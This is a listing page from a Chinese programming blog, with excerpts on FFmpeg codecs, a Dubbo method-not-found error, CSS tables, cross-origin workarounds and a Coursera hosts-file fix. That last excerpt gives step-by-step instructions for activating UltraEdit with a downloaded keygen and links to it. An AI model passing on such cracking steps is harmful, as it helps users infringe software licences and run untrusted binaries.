H.262H.264H.265 上面的编码格式都是有版权的，但是可以免费使用。此外，还有几种无版权的视频编码格式。
VP8VP9AV1 常用的音频编码格式如下。
MP3AAC 上面所有这些都是有损的编码格式，编码后会损失一些细节，以换取压缩后较小的文件体积。无损的编码格式压缩出来的文件体积较大，这里就不介绍了。
下面的命令可以查看 FFmpeg 支持的编码格式，视频编码和音频编码都在内。
$ ffmpeg -codecs
1.3 编码器 编码器（encoders）是实现某种编码格式的库文件。只有安装了某种格式的编码器，才能实现该格式视频/音频的编码和解码。
以下是一些 FFmpeg 内置的视频编码器。
libx264：最流行的开源 H.264 编码器NVENC：基于 NVIDIA GPU 的 H.264 编码器libx265：开源的 HEVC 编码器libvpx：谷歌的 VP8 和 VP9 编码器libaom：AV1 编码器 音频编码器如下。
libfdk-aacaac 下面的命令可以查看 FFmpeg 已安装的编码器。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7471788573a377313c5b8de070bbef96/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96c58b67ef2c0f984cbda5b7f84b1048/" rel="bookmark">
			调用dubbo服务时发生NoSuchMethodException
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 其实像这种找不到方法的，无外乎就是两种原因
服务提供方未注册，通常是提交了代码但未重新部署服务消费方的jar版本与服务提供方的不一致，通常是服务消费方引用了旧版本的jar，找不到新的方法，这种可能是人为忘记更新jar，也可能是版本冲突导致引用了低版本的jar 现场 Failed to invoke the method queryOrder3 in the service com.example.order.service.IOrderService. Tried 1 times of the providers [192.168.9.9:20991] (1/1) from the registry 192.168.9.193:2181 on the consumer 192.168.9.190 using the dubbo version 2.5.3. Last error is: Failed to invoke remote method: queryOrder3, provider: dubbo://192.168.9.9:20991/com.example.order.service.IOrderService?accesslog=true&amp;anyhost=true&amp;application=ods_backend_consumer&amp;check=false&amp;default.check=true&amp;default.retries=0&amp;default.timeout=15000&amp;dubbo=2.5.3&amp;interface=com.example.order.service.IOrderService&amp;logger=log4j&amp;methods=queryOrder1,queryOrder2&amp;pid=11212&amp;revision=3.2.10-SNAPSHOT&amp;side=consumer&amp;timestamp=1603184881391&amp;version=1.0, cause: com.alibaba.dubbo.rpc.RpcException: Failed to invoke remote proxy method queryOrder3 to registry://192.168.9.193:2181/com.alibaba.dubbo.registry.RegistryService?application=ods_provider&amp;backup=192.168.9.193:2182,192.168.9.193:2183&amp;dubbo=2.5.3&amp;export=dubbo%3A%2F%2F172.20.0.49%3A20991%2Fcom.example.order.service.IOrderService%3Faccesslog%3Dtrue%26anyhost%3Dtrue%26application%3Dods_provider%26default.retries%3D0%26default.timeout%3D15000%26dubbo%3D2.5.3%26interface%3Dcom.example.order.service.IOrderService%26logger%3Dlog4j%26methods%3queryOrder1%2CqueryOrder2%26pid%3D1%26revision%3DSNAPSHOT%26side%3Dprovider%26threadpool%3Dfixed%26timestamp%3D1603076554376%26version%3D1.0&amp;logger=log4j&amp;pid=1&amp;registry=zookeeper&amp;timestamp=1603076554361, cause: Not found method "queryOrder3" in class com.example.order.service.IOrderService. at com.alibaba.dubbo.rpc.proxy.AbstractProxyInvoker.invoke(AbstractProxyInvoker.java:76) ... at java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96c58b67ef2c0f984cbda5b7f84b1048/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35b79a15da80e821de019542c7f000a7/" rel="bookmark">
			CSS表格设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 CSS表格0. 表格的HTML1. 表格的边框2. 表格内 CSS表格 这学期要学jsp (什么时候还学jsp)无奈从HTML开始学习，发现html内置的表格不够美观（太难看了）
0. 表格的HTML &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Center&lt;/title&gt; &lt;style&gt; .center { margin: auto; width: 60%; background-image: url(wallhaven-4dyeeo_1920x1080.png); background-position: center; } table { border-collapse: collapse; width: 100%; } td { text-align: center; height: 50px; vertical-align: bottom; width: 33%; } td { border: 1px solid black; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="center"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;Company&lt;/td&gt; &lt;td&gt;Contact&lt;/td&gt; &lt;td&gt;Country&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Alfreds Futterkiste&lt;/td&gt; &lt;td&gt;Maria Anders&lt;/td&gt; &lt;td&gt;Germany&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Berglunds snabbköp&lt;/td&gt; &lt;td&gt;Christina Berglund&lt;/td&gt; &lt;td&gt;Sweden&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Centro comercial Moctezuma&lt;/td&gt; &lt;td&gt;Francisco Chang&lt;/td&gt; &lt;td&gt;Mexico&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Ernst Handel&lt;/td&gt; &lt;td&gt;Roland Mendel&lt;/td&gt; &lt;td&gt;Austria&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Island Trading&lt;/td&gt; &lt;td&gt;Helen Bennett&lt;/td&gt; &lt;td&gt;UK&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Königlich Essen&lt;/td&gt; &lt;td&gt;Philip Cramer&lt;/td&gt; &lt;td&gt;Germany&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Laughing Bacchus Winecellars&lt;/td&gt; &lt;td&gt;Yoshi Tannamuri&lt;/td&gt; &lt;td&gt;Canada&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Magazzini Alimentari Riuniti&lt;/td&gt; &lt;td&gt;Giovanni Rovelli&lt;/td&gt; &lt;td&gt;Italy&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;North/South&lt;/td&gt; &lt;td&gt;Simon Crowther&lt;/td&gt; &lt;td&gt;UK&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Paris spécialités&lt;/td&gt; &lt;td&gt;Marie Bertrand&lt;/td&gt; &lt;td&gt;France&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;The Big Cheese&lt;/td&gt; &lt;td&gt;Liz Nixon&lt;/td&gt; &lt;td&gt;USA&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Vaffeljernet&lt;/td&gt; &lt;td&gt;Palle Ibsen&lt;/td&gt; &lt;td&gt;Denmark&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35b79a15da80e821de019542c7f000a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d93f82e78edbc8bd51a41c80c288b4dc/" rel="bookmark">
			前端学习（2442）：解决跨域问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.同源策略如下： URL说明是否允许通信http://www.a.com/a.js
http://www.a.com/b.js同一域名下允许http://www.a.com/lab/a.js
http://www.a.com/script/b.js同一域名下不同文件夹允许http://www.a.com:8000/a.js
http://www.a.com/b.js同一域名，不同端口不允许http://www.a.com/a.js
https://www.a.com/b.js同一域名，不同协议不允许http://www.a.com/a.js
http://70.32.92.74/b.js域名和域名对应ip不允许http://www.a.com/a.js
http://script.a.com/b.js主域相同，子域不同不允许http://www.a.com/a.js
http://a.com/b.js同一域名，不同二级域名（同上）不允许（cookie这种情况下也不允许访问）http://www.cnblogs.com/a.js
http://www.a.com/b.js不同域名不允许 特别注意两点：
第一，如果是协议和端口造成的跨域问题“前台”是无能为力的，
第二：在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。
“URL的首部”指window.location.protocol +window.location.host，也可以理解为“Domains, protocols and ports must match”。
2. 前端解决跨域问题 1&gt; document.domain + iframe (只有在主域相同的时候才能使用该方法) 1) 在www.a.com/a.html中：
document.domain = 'a.com'; var ifr = document.createElement('iframe'); ifr.src = 'http://www.script.a.com/b.html'; ifr.display = none; document.body.appendChild(ifr); ifr.onload = function(){ var doc = ifr.contentDocument || ifr.contentWindow.document; //在这里操作doc，也就是b.html ifr.onload = null; }; 2) 在www. script.a.com/b.html中：
document.domain = 'a.com'; 2&gt; 动态创建script 这个没什么好说的，因为script标签不受同源策略的限制。
function loadScript(url, func) { var head = document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d93f82e78edbc8bd51a41c80c288b4dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6f879b21ed229b193f9096258f10204/" rel="bookmark">
			Coursera的视频一直加载无法播放问题的完整解决【win10】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Coursera的视频一直加载无法播放问题的完整解决【win10】 问题来源：注册了coursera，准备原汁原味地学练吴恩达老师的机器学习和深度学习教程，自加入课程起会有日程安排，太懒了，拖到人家连发3封邮件来催按时完成课程，才可耻地去被动学习了。一直加载，换了别的课程也是如此，啊~~~一颗想学习的心好难！
coursera网址：https://www.coursera.org
一.找原因
貌似更换了服务器，需要修改hosts文件。
二.解决步骤
在这个在线解析工具里输入域名 d3c33hcgiwev3.cloudfront.net ，会返回一连串的ip地址。
【在此感谢托比欧提供的解析工具地址】
2.用管理员权限打开hosts文件。
直达路径：C:\Windows\System32\drivers\etc
【感谢marsggbo简单粗暴的解答，省去finder步骤，直达hosts文件】
3.将自动解析工具解析给的IP按照正确格式都添加在hosts文件末尾。【此处需要用编译器】
4.替换原路径的hosts文件，刷新coursera网址就好啦~
三.遇到问题–UltraEdit编译器安装与破解
万万没想到，我当时安装的UltraEdit竟然是试用版没破解，疫情后返校，它理直气壮地过期了、、、
可以使用其他随便什么编译器，但我就是比较轴，一定要让UltraEdit继续~【dbq,又嫖了】
网上的XX软件园搜到的注册机都**是各种附加大全套的流氓软件，上当受骗了3次的我感谢玛丽奥ZJY的拯救！
注册机下载与激活：https://pan.baidu.com/s/1sfycBrZAizcozrIbgwh9gg
1.关闭UltraEdit，断网后运行，点击“激活码”;
2.许可证ID、密码随便填写，点击“激活”，注意不能使用字母！！ （我都用的123456，嘿嘿~简单好记，后面要用）自动弹出“连接错误”窗口，点击“脱机激活”，脱机激活窗弹出“用户码1、用户码2”;
3.运行UltraEdit 注册机，Program项选择“UltraEdit 21.30”，将“用户码1、用户码2”分别复制到“User Code 1、User Code 2”对应处;
4.点击“Generate”，将生成的Authorization Code 1、Authorization Code 2分别复制到脱机激活窗口对应项，输入之前填写的许可证ID和密码，点击“激活”，那个提示试用到期的框框就消失了~over。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/229/">«</a>
	<span class="pagination__item pagination__item--current">230/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/231/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>